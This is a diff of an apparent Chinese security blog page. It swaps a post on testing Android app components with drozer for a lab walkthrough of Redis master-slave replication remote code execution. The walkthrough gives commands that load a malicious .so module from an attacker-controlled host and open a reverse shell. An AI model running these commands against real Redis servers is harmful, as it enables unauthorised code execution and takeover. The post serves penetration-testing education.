@@ -14,11 +14,11 @@
     <script async defer src="https://buttons.github.io/buttons.js"></script>
     <title>
         
-          使用drozer框架测试安卓组件 - Kat | Blog
+          redis主从复制getshell - Kat | Blog
         
     </title>
 
-    <link rel="canonical" href="https://spanning-tree.xyz/2020/112273054a.html">
+    <link rel="canonical" href="https://spanning-tree.xyz/2020/12eeb7b3d2.html">
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -88,14 +88,14 @@
                     <div class="post-heading">
                         <div class="tags">
                             
-                              <a class="tag" href="/tags/#移动安全" title="移动安全">移动安全</a>
+                              <a class="tag" href="/tags/#渗透测试" title="渗透测试">渗透测试</a>
                             
                         </div>
-                        <h1>使用drozer框架测试安卓组件</h1>
+                        <h1>redis主从复制getshell</h1>
                         <h2 class="subheading"></h2>
                         <span class="meta">
                             Posted by Kat on
-                            2020-11-23
+                            2020-12-06
                         </span>
                     </div>
                 
@@ -215,47 +215,39 @@
                 col-md-10 col-md-offset-1
                 post-container">
 
-                <h2 id="使用drozer框架测试安卓组件">使用drozer框架测试安卓组件</h2>
-<h4 id="环境准备">环境准备</h4>
-<p>运行drozer框架，安卓端开启drozer</p>
-<p><img src="https://i.loli.net/2020/11/23/kWOxS7bzpnyDocw.png" alt="image-20201123203702949"></p>
-<p>使用adb检测是否能够连接到测试机器，成功连接后进行端口转发。</p>
-<p><img src="https://i.loli.net/2020/11/23/npaSQJ2HjMOdxhX.png" alt="image-20201123203912580"></p>
-<h4 id="测试安卓框架">测试安卓框架</h4>
-<p>查找app攻击面</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.package.attacksurface 包名</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2020/11/23/chSpKdX6lezqI2g.png" alt="image-20201123204128295"></p>
-<h4 id="导出组件activity拒绝服务漏洞">导出组件Activity拒绝服务漏洞</h4>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.activity.info --package 包名</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2020/11/23/1NHraPBICkKWz4i.png" alt="image-20201123204336649"></p>
-<p>对搜索到的Activity逐个执行以下命令，尝试启动Activity</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.activity.start --component 包名 组件名</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2020/11/23/1NHraPBICkKWz4i.png" alt="image-20201123204730454"></p>
-<p>若目标应用崩溃，则该组件存在拒绝服务漏洞。</p>
-<h4 id="导出组件service拒绝服务漏洞">导出组件Service拒绝服务漏洞</h4>
-<p>执行以下命令，获取当前应用导出的Service:</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.service.info --package 包名</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2020/11/23/1NHraPBICkKWz4i.png" alt="image-20201123204941084"></p>
-<p>对搜索到的Service逐个执行以下命令，尝试启动Service：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.service.start --component 包名 组件名</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2020/11/23/MpQKeYXg4PTr9yB.png" alt="image-20201123205100872"></p>
-<h4 id="导出组件broadcast-receiver拒绝服务漏洞">导出组件Broadcast Receiver拒绝服务漏洞</h4>
-<p>执行以下命令，获取当前应用导出的Broadcast Receiver：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.broadcast.info --package 包名</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2020/11/23/iCDUXIs5MYHA9Fw.png" alt="image-20201123205250632"></p>
-<p>对搜索到的Broadcast Receiver逐个执行以下命令，尝试启动Broadcast<br>
-Receiver：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.broadcast.send --component 包名 组件名</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2020/11/23/BI18XQ5nRtUiNlk.png" alt="image-20201123205450783"></p>
-<p>若目标应用崩溃，则该组件存在拒绝服务漏洞。</p>
-<h4 id="导出组件content-provider数据泄露">导出组件Content Provider数据泄露</h4>
-<p>执行以下命令，获取当前应用导出的Content Provider URI</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner.provider.finduris --package 包名</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2020/11/23/szU6cSJgiGIkLAo.png" alt="image-20201123205802255"></p>
-<p>对搜索到的URI逐个执行以下命令，尝试读取Content Provider中的数据</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query URI --vertical</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2020/11/23/BRQAyheaCx4YZLS.png" alt="image-20201123210151862"></p>
-<p>检查输出的数据是否包含敏感信息。</p>
+                <h2 id="redis主从复制getshell">redis主从复制getshell</h2>
+<h4 id="1-主从复制介绍">1、主从复制介绍</h4>
+<p>和Mysql主从复制的原因一样，Redis虽然读取写入的速度都特别快，但是也会产生读压力特别大的情况。</p>
+<p>为了分担读压力，Redis支持主从复制，Redis的主从结构可以采用一主多从或者级联结构，Redis主从复制可以根据是否是全量分为全量同步和增量同步。</p>
+<h4 id="2-影响版本">2、影响版本</h4>
+<p>4.x-6.0.5</p>
+<p>在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在Redis中实现一个新的Redis命令，通过写C语言编译并加载恶意的.so文件，达到代码执行的目的。在6.0.5版本之后修复了此问题。</p>
+<h4 id="3-环境搭建">3、环境搭建</h4>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-5.0.9.tar.gz</span><br><span class="line">tar -zxf redis-5.0.9</span><br><span class="line">make</span><br><span class="line">cd src</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
+<p>高版本默认不允许进行远程连接，需要修改配置文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim redis.conf</span><br></pre></td></tr></table></figure>
+<p>注释<br>
+<img src="https://tva1.sinaimg.cn/large/0081Kckwgy1gleg4jo4pkj311w0awacl.jpg" alt="image-20201206211526358"></p>
+<p>取消密码认证</p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1gleg402dfrj30xs09ggoy.jpg" alt="image-20201206211452502"></p>
+<h4 id=""></h4>
+<p>重新运行redis</p>
+<p>redis-server redis.conf（源码安装需要指定配置文件进行启动）</p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1gleg8x0z80j30y80u07f8.jpg" alt="image-20201206211934930"></p>
+<h4 id="4-漏洞利用">4、漏洞利用</h4>
+<p>通过redis主从复制加载外部.so文件，变成redis功能中的一部分，从而实现功能扩展。</p>
+<p>我们编译恶意的.so文件，同步至redis上进而实现恶意代码的功能。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">下载外部so文件</span><br><span class="line">git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</span><br><span class="line">编译</span><br><span class="line">make（使用MAC系统编译可能无法在src目录下生成so文件）</span><br></pre></td></tr></table></figure>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glegtkso4uj30zu0iwajl.jpg" alt="image-20201206213929485"></p>
+<p>使用攻击脚本</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Ridter/redis-rce.git</span><br><span class="line">python3 redis-rce.py -r 10.211.55.4 -p 6379 -L 192.168.1.101 -f module.so</span><br></pre></td></tr></table></figure>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glehp3qvdej31d00ps47m.jpg" alt="image-20201206220944389"></p>
+<p>选择shell的交互方式</p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glehxepexzj319w0iutgx.jpg" alt="image-20201206221745699"></p>
+<p>输入r进行反弹shell，我们在测试的时候发现使用反弹shell方式比较容易导致靶机redis服务异常中断，推荐使用shell交互模式。</p>
+<p>查看redis日志可以发现把攻击机当作master机器进行复制扩展</p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glei0dpabhj31kk0oi4eb.jpg" alt="image-20201206222037601"></p>
+<p>另外redis主从复制还可以使用手动的方式，本地起恶意的redis服务器，监听本地端口加在exp.so文件。</p>
 
                 
 
@@ -263,13 +255,9 @@ Receiver：</p>
                 <!-- Pager -->
                 <ul class="pager">
                     
-                        <li class="previous">
-                            <a href="/2020/12eeb7b3d2.html" data-toggle="tooltip" data-placement="top" title="redis主从复制getshell">&larr; Previous Post</a>
-                        </li>
-                    
                     
                         <li class="next">
-                            <a href="/2020/11d3b845db.html" data-toggle="tooltip" data-placement="top" title="MS17_010py脚本利用">Next Post &rarr;</a>
+                            <a href="/2020/112273054a.html" data-toggle="tooltip" data-placement="top" title="使用drozer框架测试安卓组件">Next Post &rarr;</a>
                         </li>
                     
                 </ul>
@@ -325,7 +313,7 @@ Receiver：</p>
         <div id="toc" class="toc-article">
         <strong class="toc-title">Contents</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#使用drozer框架测试安卓组件"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">&#x4F7F;&#x7528;drozer&#x6846;&#x67B6;&#x6D4B;&#x8BD5;&#x5B89;&#x5353;&#x7EC4;&#x4EF6;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#环境准备"><span class="toc-nav-number">1.0.1.</span> <span class="toc-nav-text">&#x73AF;&#x5883;&#x51C6;&#x5907;</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#测试安卓框架"><span class="toc-nav-number">1.0.2.</span> <span class="toc-nav-text">&#x6D4B;&#x8BD5;&#x5B89;&#x5353;&#x6846;&#x67B6;</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#导出组件activity拒绝服务漏洞"><span class="toc-nav-number">1.0.3.</span> <span class="toc-nav-text">&#x5BFC;&#x51FA;&#x7EC4;&#x4EF6;Activity&#x62D2;&#x7EDD;&#x670D;&#x52A1;&#x6F0F;&#x6D1E;</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#导出组件service拒绝服务漏洞"><span class="toc-nav-number">1.0.4.</span> <span class="toc-nav-text">&#x5BFC;&#x51FA;&#x7EC4;&#x4EF6;Service&#x62D2;&#x7EDD;&#x670D;&#x52A1;&#x6F0F;&#x6D1E;</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#导出组件broadcast-receiver拒绝服务漏洞"><span class="toc-nav-number">1.0.5.</span> <span class="toc-nav-text">&#x5BFC;&#x51FA;&#x7EC4;&#x4EF6;Broadcast Receiver&#x62D2;&#x7EDD;&#x670D;&#x52A1;&#x6F0F;&#x6D1E;</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#导出组件content-provider数据泄露"><span class="toc-nav-number">1.0.6.</span> <span class="toc-nav-text">&#x5BFC;&#x51FA;&#x7EC4;&#x4EF6;Content Provider&#x6570;&#x636E;&#x6CC4;&#x9732;</span></a></li></ol></li></ol></li></ol>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#redis主从复制getshell"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">redis&#x4E3B;&#x4ECE;&#x590D;&#x5236;getshell</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#1-主从复制介绍"><span class="toc-nav-number">1.0.1.</span> <span class="toc-nav-text">1&#x3001;&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x4ECB;&#x7ECD;</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#2-影响版本"><span class="toc-nav-number">1.0.2.</span> <span class="toc-nav-text">2&#x3001;&#x5F71;&#x54CD;&#x7248;&#x672C;</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#3-环境搭建"><span class="toc-nav-number">1.0.3.</span> <span class="toc-nav-text">3&#x3001;&#x73AF;&#x5883;&#x642D;&#x5EFA;</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#"><span class="toc-nav-number">1.0.4.</span> <span class="toc-nav-text"></span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#4-漏洞利用"><span class="toc-nav-number">1.0.5.</span> <span class="toc-nav-text">4&#x3001;&#x6F0F;&#x6D1E;&#x5229;&#x7528;</span></a></li></ol></li></ol></li></ol>
         
         </div>
       </aside>
@@ -345,7 +333,7 @@ Receiver：</p>
                     <h5><a href="/tags/">FEATURED TAGS</a></h5>
                     <div class="tags">
                        
-                          <a class="tag" href="/tags/#移动安全" title="移动安全">移动安全</a>
+                          <a class="tag" href="/tags/#渗透测试" title="渗透测试">渗透测试</a>
                         
                     </div>
                 </section>
